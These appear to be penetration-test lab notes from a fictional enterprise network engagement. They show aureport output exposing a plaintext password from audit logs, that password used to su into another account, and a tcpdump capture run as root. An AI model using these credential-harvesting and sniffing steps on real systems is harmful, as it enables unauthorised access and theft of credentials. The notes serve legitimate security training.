# Logging output - Extracted Evidence

Compiled from ACME-IPT engagement notes (Attacking Enterprise Networks vault).

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~544_

```
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

---

### # date time event auid term sess comm data
_Source: External-Attack2, line ~565_

```

        
webdev@dmz01:/var/www/html/monitoring$ su srvadm

Password: 
$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ /bin/bash -i

srvadm@dmz01:/var/www/html/monitoring$
```

---

### #### **Enumerating 172.16.8.20 - DotNetNuke (DNN)**
_Source: Internal-Testing, line ~592_

```
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes
^C2027 packets captured
2033 packets received by filter
0 packets dropped by kernel
```
